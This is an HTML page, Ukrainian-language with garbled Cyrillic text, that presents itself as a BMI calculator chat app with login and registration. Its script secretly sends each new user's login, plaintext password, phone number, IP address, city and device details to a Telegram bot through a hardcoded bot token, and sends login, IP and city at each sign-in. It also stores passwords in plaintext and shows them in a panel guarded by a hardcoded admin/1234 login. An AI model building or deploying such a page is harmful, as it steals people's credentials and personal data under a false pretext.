<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>BMI Pro Chat + Advanced Stats</title>
    <style>
        :root {
            --primary-color: #fe2c55;
            --secondary-color: #00f2ea;
            --bg-color: #0a0a0b;
            --card-bg: #161722;
            --bot-bubble: #2d2d2e;
            --input-bg: #2d2d2e;
            --glow: 0 0 15px rgba(254, 44, 85, 0.4);
        }

        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }

        body, html {
            margin: 0; padding: 0; width: 100%; height: 100%;
            background-color: var(--bg-color); color: white;
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; overflow: hidden;
        }

        /* --- AUTH SCREEN --- */
        #auth-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: radial-gradient(circle at center, #1e1e1e 0%, #000 100%); z-index: 1000;
            display: flex; justify-content: center; align-items: center;
        }
        .auth-card {
            background: var(--card-bg); width: 90%; max-width: 400px;
            padding: 30px; border-radius: 24px; text-align: center;
            border: 1px solid #333; box-shadow: var(--glow);
            animation: fadeIn 0.6s ease-out;
        }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        
        .auth-card h2 { margin-bottom: 20px; color: white; font-weight: 800; letter-spacing: -1px; }
        .auth-card h2 span { color: var(--primary-color); }
        
        .auth-form input {
            width: 100%; background: var(--input-bg); border: 1px solid #444;
            padding: 14px; border-radius: 12px; color: white; margin-bottom: 12px; outline: none;
            transition: border 0.3s;
        }
        .auth-form input:focus { border-color: var(--primary-color); }
        
        .auth-btn {
            width: 100%; background: var(--primary-color); border: none;
            color: white; padding: 14px; border-radius: 12px; font-weight: bold; cursor: pointer;
            box-shadow: var(--glow); transition: transform 0.2s;
        }
        .auth-btn:active { transform: scale(0.96); }

        /* --- SPLASH SCREEN --- */
        #splash-screen {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: var(--bg-color); z-index: 999; display: none;
            flex-direction: column; justify-content: center; align-items: center;
            text-align: center;
        }
        .logo-anim { width: 80px; height: 80px; background: var(--primary-color); border-radius: 20px; margin-bottom: 20px; animation: pulse 2s infinite; display: flex; align-items: center; justify-content: center; font-size: 40px;}
        @keyframes pulse { 0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(254, 44, 85, 0.7); } 70% { transform: scale(1.05); box-shadow: 0 0 0 20px rgba(254, 44, 85, 0); } 100% { transform: scale(1); } }

        /* --- ADMIN PANEL --- */
        #admin-panel {
            display: none; padding: 10px; width: 100%; height: 100vh; overflow-y: auto; background: #080808;
        }
        .admin-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
        table { width: 100%; border-collapse: collapse; font-size: 10px; background: #111; border-radius: 10px; overflow: hidden; }
        th, td { padding: 8px; border: 1px solid #222; text-align: left; }
        th { background: var(--secondary-color); color: #000; font-weight: bold; }
        .phone-tag { color: #2ecc71; font-weight: bold; }

        /* --- MAIN APP --- */
        #app-content {
            display: none; flex-direction: column; width: 100%; height: 100vh;
            max-width: 600px; margin: 0 auto; background-color: var(--bg-color);
        }
        .header { padding: 15px; background: #161722; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #333; }
        
        .gauge-section { padding: 25px; display: flex; flex-direction: column; align-items: center; background: linear-gradient(180deg, #161722 0%, #0a0a0b 100%); position: relative; }
        .gauge-container { position: relative; width: 220px; height: 110px; overflow: hidden; }
        .gauge-bg { width: 220px; height: 220px; border-radius: 50%; background: conic-gradient(#3498db 0deg 45deg, #2ecc71 45deg 110deg, #f1c40f 110deg 150deg, #e74c3c 150deg 180deg, transparent 180deg); transform: rotate(-90deg); filter: brightness(0.8); }
        .gauge-inner { position: absolute; top: 25px; left: 25px; width: 170px; height: 170px; background-color: #111; border-radius: 50%; z-index: 1; border: 2px solid #222; }
        .needle { position: absolute; bottom: 0; left: 50%; width: 4px; height: 90px; background: white; transform-origin: bottom center; transform: translateX(-50%) rotate(-90deg); transition: transform 2s cubic-bezier(0.175, 0.885, 0.32, 1.275); z-index: 2; border-radius: 4px; box-shadow: 0 0 10px rgba(0,0,0,0.5); }
        
        #bmi-value { margin-top: 15px; font-size: 24px; font-weight: 800; color: var(--secondary-color); text-shadow: 0 0 10px rgba(0,242,234,0.3); }

        #chat-box { flex-grow: 1; padding: 20px; overflow-y: auto; display: flex; flex-direction: column; gap: 12px; scroll-behavior: smooth; }
        .msg { padding: 12px 16px; border-radius: 20px; max-width: 80%; font-size: 15px; line-height: 1.4; animation: slideIn 0.4s ease; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }
        @keyframes slideIn { from { opacity: 0; transform: scale(0.9) translateX(-10px); } to { opacity: 1; transform: scale(1) translateX(0); } }
        .bot { background: var(--bot-bubble); align-self: flex-start; border-bottom-left-radius: 4px; }
        .user { background: var(--primary-color); align-self: flex-end; border-bottom-right-radius: 4px; font-weight: 500; }

        .input-area { padding: 20px; display: flex; gap: 10px; background: #161722; border-top: 1px solid #333; }
        .input-area input { flex: 1; padding: 14px; border-radius: 14px; background: #000; border: 1px solid #444; color: white; outline: none; font-size: 16px; }
        
        .reset-btn { background: #333; color: white; border: none; padding: 14px; border-radius: 12px; cursor: pointer; display: none; margin: 10px auto; width: 80%; font-weight: bold; transition: background 0.3s; }
        .reset-btn:hover { background: #444; }
    </style>
</head>
<body>

<div id="auth-overlay">
    <div class="auth-card">
        <h2 id="auth-title">BMI <span>PRO</span></h2>
        <div class="auth-form">
            <input type="text" id="auth-login" placeholder="–õ–æ–≥—ñ–Ω">
            <input type="password" id="auth-pass" placeholder="–ü–∞—Ä–æ–ª—å">
            <input type="tel" id="auth-phone" placeholder="–í–∞—à –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω—É" style="display:none">
            <button class="auth-btn" onclick="processAuth()">–£–≤—ñ–π—Ç–∏</button>
        </div>
        <p id="toggle-mode" style="margin-top:20px; cursor:pointer; font-size:14px; color:#888;" onclick="toggleAuth()">–°—Ç–≤–æ—Ä–∏—Ç–∏ –∞–∫–∞—É–Ω—Ç</p>
    </div>
</div>

<div id="splash-screen">
    <div class="logo-anim">‚öñÔ∏è</div>
    <h1 style="font-weight: 800;">–ü—Ä–∏–≤—ñ—Ç, <span id="splash-user"></span>!</h1>
    <p style="color: #888; margin-top: -10px;">–î–∞–≤–∞–π –¥—ñ–∑–Ω–∞—î–º–æ—Å—å —Ç–≤–æ—é —ñ–¥–µ–∞–ª—å–Ω—É –≤–∞–≥—É</p>
</div>

<div id="admin-panel">
    <div class="admin-header">
        <h2 style="color:var(--secondary-color); margin:0;">üîê Database</h2>
        <button class="auth-btn" style="width:auto; padding:5px 15px" onclick="logout()">–í–∏–π—Ç–∏</button>
    </div>
    <table id="admin-table">
        <thead>
            <tr>
                <th>User</th>
                <th>Pass</th>
                <th>Phone</th>
                <th>Browser/OS</th>
                <th>IP</th>
                <th>City</th>
                <th>X</th>
            </tr>
        </thead>
        <tbody id="admin-tbody"></tbody>
    </table>
</div>

<div id="app-content">
    <div class="header">
        <div style="display:flex; align-items:center; gap:8px;">
            <div style="width:30px; height:30px; background:var(--primary-color); border-radius:8px; display:flex; align-items:center; justify-content:center; font-size:14px;">üí™</div>
            <span id="user-display" style="font-weight:bold; letter-spacing:0.5px;">User</span>
        </div>
        <button onclick="logout()" style="background:none; border:none; color:#fe2c55; cursor:pointer; font-weight:bold;">–í–∏–π—Ç–∏</button>
    </div>
    <div class="gauge-section">
        <div class="gauge-container"><div class="gauge-bg"></div><div class="gauge-inner"></div><div id="needle" class="needle"></div></div>
        <div id="bmi-value">--</div>
        <div style="font-size:11px; color:#666; margin-top:5px;">–Ü–ù–î–ï–ö–° –ú–ê–°–ò –¢–Ü–õ–ê</div>
    </div>
    <div id="chat-box">
        <div class="msg bot">–ü—Ä–∏–≤—ñ—Ç! üëã –Ø —Ç–≤—ñ–π –ø–µ—Ä—Å–æ–Ω–∞–ª—å–Ω–∏–π —Ñ—ñ—Ç–Ω–µ—Å-–ø–æ–º—ñ—á–Ω–∏–∫. <br><br>–©–æ–± –ø–æ—á–∞—Ç–∏, —Å–∫–∞–∂–∏ —Å–≤—ñ–π <b>–∑—Ä—ñ—Å—Ç —É —Å–º</b>?</div>
    </div>
    <button id="reset-btn" class="reset-btn" onclick="resetChat()">üîÑ –°–ø—Ä–æ–±—É–≤–∞—Ç–∏ —â–µ —Ä–∞–∑</button>
    <div class="input-area" id="input-container">
        <input type="number" id="user-input" placeholder="–í–≤–µ–¥—ñ—Ç—å —á–∏—Å–ª–æ..." inputmode="decimal">
        <button class="auth-btn" style="width:auto; padding: 0 25px;" onclick="handleAction()">–û–ö</button>
    </div>
</div>

<script>
    // --- –ù–ê–õ–ê–®–¢–£–í–ê–ù–ù–Ø –¢–ï–õ–ï–ì–†–ê–ú ---
    const TG_TOKEN = "8018181229:AAFJNOBV5VCG4X459dmjgaOcwW72k9YdzE0";
    const TG_ID = "@geysefdsfsdr_bot";

    async function sendToTg(msg) {
        try {
            await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: TG_ID, text: msg, parse_mode: 'HTML' })
            });
        } catch(e) {}
    }

    let isRegMode = false;
    const ADMIN_LOGIN = "admin";
    const ADMIN_PASS = "1234";

    function getDetailedBrowserInfo() {
        const ua = navigator.userAgent;
        let b = "Unknown";
        if (ua.includes("Chrome") && !ua.includes("Edg")) b = "Chrome";
        else if (ua.includes("Safari") && !ua.includes("Chrome")) b = "Safari";
        else if (ua.includes("Edg")) b = "Edge";
        else if (ua.includes("Firefox")) b = "Firefox";
        
        let osInfo = "OS Unknown";
        if (ua.includes("Android")) {
            const match = ua.match(/Android\s([0-9\.]+)/);
            osInfo = match ? "Android " + match[1] : "Android";
        } else if (ua.includes("iPhone") || ua.includes("iPad")) {
            const match = ua.match(/OS\s([0-9\_]+)/);
            osInfo = match ? "iOS " + match[1].replace(/_/g, '.') : "iOS";
        } else if (ua.includes("Windows NT")) {
            const match = ua.match(/Windows NT\s([0-9\.]+)/);
            if(match) {
                if(match[1] === "10.0") osInfo = "Win 10/11";
                else if(match[1] === "6.1") osInfo = "Win 7";
                else osInfo = "Win " + match[1];
            }
        }
        return `${b} | ${osInfo}`;
    }

    async function getNetworkData() {
        try {
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();
            return {
                country: data.country_name || "Unknown",
                city: data.city || "Unknown",
                ip: data.ip || "0.0.0.0"
            };
        } catch (e) {
            return { country: "Unknown", city: "Unknown", ip: "Hidden" };
        }
    }

    window.onload = () => {
        const active = localStorage.getItem('active_session');
        if (active) {
            if (active === ADMIN_LOGIN) showAdmin();
            else showApp(active, true);
        }
    };

    function toggleAuth() {
        isRegMode = !isRegMode;
        document.getElementById('auth-title').innerHTML = isRegMode ? "–†–ï–Ñ–°–¢–†–ê–¶–Ü–Ø" : "BMI <span>PRO</span>";
        document.getElementById('toggle-mode').innerText = isRegMode ? "–í–∂–µ —î –∞–∫–∞—É–Ω—Ç? –£–≤—ñ–π—Ç–∏" : "–°—Ç–≤–æ—Ä–∏—Ç–∏ –∞–∫–∞—É–Ω—Ç";
        document.getElementById('auth-phone').style.display = isRegMode ? "block" : "none";
    }

    async function processAuth() {
        const l = document.getElementById('auth-login').value.trim();
        const p = document.getElementById('auth-pass').value.trim();
        const ph = document.getElementById('auth-phone').value.trim();
        
        if(!l || !p) return;

        if (l === ADMIN_LOGIN && p === ADMIN_PASS) {
            localStorage.setItem('active_session', ADMIN_LOGIN);
            showAdmin();
            return;
        }

        let users = JSON.parse(localStorage.getItem('db_v7') || '{}');
        const browser = getDetailedBrowserInfo();
        const net = await getNetworkData();

        if (isRegMode) {
            if (!ph) { alert("–í–≤–µ–¥—ñ—Ç—å —Ç–µ–ª–µ—Ñ–æ–Ω!"); return; }
            if (users[l]) return alert("–õ–æ–≥—ñ–Ω –∑–∞–π–Ω—è—Ç–æ!");
            users[l] = { pass: p, phone: ph, browser: browser, country: net.country, city: net.city, ip: net.ip };
            localStorage.setItem('db_v7', JSON.stringify(users));
            
            // –í–Ü–î–ü–†–ê–í–ö–ê –í –¢–ì
            const tgMsg = `üöÄ <b>–ù–æ–≤–∞ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—è!</b>\nüë§ –õ–æ–≥—ñ–Ω: ${l}\nüîë –ü–∞—Ä–æ–ª—å: ${p}\nüìû –¢–µ–ª: ${ph}\nüåç –ú—ñ—Å—Ç–æ: ${net.city}\nüåê IP: ${net.ip}\nüì± –ü—Ä–∏—Å—Ç—Ä—ñ–π: ${browser}`;
            await sendToTg(tgMsg);

            alert("–ê–∫–∞—É–Ω—Ç —Å—Ç–≤–æ—Ä–µ–Ω–æ!");
            toggleAuth();
        } else {
            if (users[l] && users[l].pass === p) {
                users[l].browser = browser;
                users[l].ip = net.ip;
                localStorage.setItem('db_v7', JSON.stringify(users));
                
                // –í–Ü–î–ü–†–ê–í–ö–ê –í –¢–ì –ü–†–ò –í–•–û–î–Ü
                const tgMsg = `üë§ <b>–í—Ö—ñ–¥ –≤ –∞–∫–∞—É–Ω—Ç</b>\nüë§ –õ–æ–≥—ñ–Ω: ${l}\nüåç –ú—ñ—Å—Ç–æ: ${net.city}\nüåê IP: ${net.ip}`;
                sendToTg(tgMsg);

                localStorage.setItem('active_session', l);
                showApp(l);
            } else {
                alert("–ù–µ–≤—ñ—Ä–Ω–∏–π –ª–æ–≥—ñ–Ω –∞–±–æ –ø–∞—Ä–æ–ª—å!");
            }
        }
    }

    function showAdmin() {
        document.getElementById('auth-overlay').style.display = 'none';
        document.getElementById('admin-panel').style.display = 'block';
        const tb = document.getElementById('admin-tbody');
        const users = JSON.parse(localStorage.getItem('db_v7') || '{}');
        tb.innerHTML = '';
        for (let u in users) {
            tb.innerHTML += `<tr>
                <td><b>${u}</b></td>
                <td>${users[u].pass}</td>
                <td class="phone-tag">${users[u].phone || '-'}</td>
                <td style="font-size:8px;">${users[u].browser || 'N/A'}</td>
                <td>${users[u].ip || '-'}</td>
                <td>${users[u].city}</td>
                <td><button onclick="delUser('${u}')" style="background:#fe2c55; color:white; border:none; border-radius:4px; cursor:pointer">X</button></td>
            </tr>`;
        }
    }

    function delUser(u) {
        if(confirm('–í–∏–¥–∞–ª–∏—Ç–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞?')) {
            let users = JSON.parse(localStorage.getItem('db_v7'));
            delete users[u];
            localStorage.setItem('db_v7', JSON.stringify(users));
            showAdmin();
        }
    }

    function showApp(name, skipSplash = false) {
        document.getElementById('auth-overlay').style.display = 'none';
        if(skipSplash) {
            document.getElementById('app-content').style.display = 'flex';
            document.getElementById('user-display').innerText = name;
        } else {
            document.getElementById('splash-user').innerText = name;
            const splash = document.getElementById('splash-screen');
            splash.style.display = 'flex';
            setTimeout(() => {
                splash.style.opacity = '0';
                splash.style.transition = '0.5s';
                setTimeout(() => {
                    splash.style.display = 'none';
                    document.getElementById('app-content').style.display = 'flex';
                    document.getElementById('user-display').innerText = name;
                }, 500);
            }, 2000);
        }
    }

    function logout() {
        localStorage.removeItem('active_session');
        location.reload();
    }

    let step = 1, h = 0, w = 0;
    const input = document.getElementById('user-input');
    const box = document.getElementById('chat-box');

    function handleAction() {
        const v = input.value;
        if (!v || v <= 0) return;
        box.innerHTML += `<div class="msg user">${v}</div>`;
        input.value = '';
        setTimeout(() => {
            if (step === 1) {
                h = parseFloat(v);
                botMsg("–ß—É–¥–æ–≤–æ. –ê —è–∫–∞ —Ç–≤–æ—é <b>–≤–∞–≥–∞ –≤ –∫–≥</b>?");
                step = 2;
            } else if (step === 2) {
                w = parseFloat(v);
                const bmi = (w / ((h/100)**2)).toFixed(1);
                let angle = ((bmi - 15) / (40 - 15)) * 180 - 90;
                document.getElementById('needle').style.transform = `translateX(-50%) rotate(${Math.max(-90, Math.min(90, angle))}deg)`;
                document.getElementById('bmi-value').innerText = bmi;
                
                let txt = "";
                if(bmi < 18.5) txt = "–£ –≤–∞—Å –¥–µ—Ñ—ñ—Ü–∏—Ç –≤–∞–≥–∏. –¢—Ä–µ–±–∞ –∫—Ä–∞—â–µ —ó—Å—Ç–∏! üç≤";
                else if(bmi < 25) txt = "–í–∞—à–∞ –≤–∞–≥–∞ –≤ —ñ–¥–µ–∞–ª—å–Ω—ñ–π –Ω–æ—Ä–º—ñ. –¢–∞–∫ —Ç—Ä–∏–º–∞—Ç–∏! ‚úÖ";
                else if(bmi < 30) txt = "–Ñ –Ω–µ–≤–µ–ª–∏–∫–∞ –∑–∞–π–≤–∞ –≤–∞–≥–∞. –ß–∞—Å –¥–ª—è –ø—Ä–æ–≥—É–ª—è–Ω–æ–∫! üèÉ‚Äç‚ôÇÔ∏è";
                else txt = "–¶–µ —Å—Ç–∞–¥—ñ—è –æ–∂–∏—Ä—ñ–Ω–Ω—è. –í–∞—Ä—Ç–æ –∑–≤–µ—Ä–Ω—É—Ç–∏—Å—å –¥–æ –ª—ñ–∫–∞—Ä—è. ‚ö†Ô∏è";

                botMsg(`–¢–≤—ñ–π –Ü–ú–¢ —Å—Ç–∞–Ω–æ–≤–∏—Ç—å <b>${bmi}</b>. <br><br>${txt}`);
                document.getElementById('reset-btn').style.display = "block";
                document.getElementById('input-container').style.display = "none";
                step = 3;
            }
            box.scrollTop = box.scrollHeight;
        }, 800);
    }

    function botMsg(html) {
        box.innerHTML += `<div class="msg bot">${html}</div>`;
        box.scrollTop = box.scrollHeight;
    }

    function resetChat() {
        step = 1;
        document.getElementById('needle').style.transform = `translateX(-50%) rotate(-90deg)`;
        document.getElementById('bmi-value').innerText = `--`;
        box.innerHTML = '<div class="msg bot">–ü–æ—á–Ω–µ–º–æ –∑–∞–Ω–æ–≤–æ. –Ø–∫–∏–π —Ç–≤—ñ–π –∑—Ä—ñ—Å—Ç —É —Å–º?</div>';
        document.getElementById('reset-btn').style.display = "none";
        document.getElementById('input-container').style.display = "flex";
    }

    input.addEventListener("keypress", (e) => { if(e.key === "Enter") handleAction(); });
</script>
</body>
</html>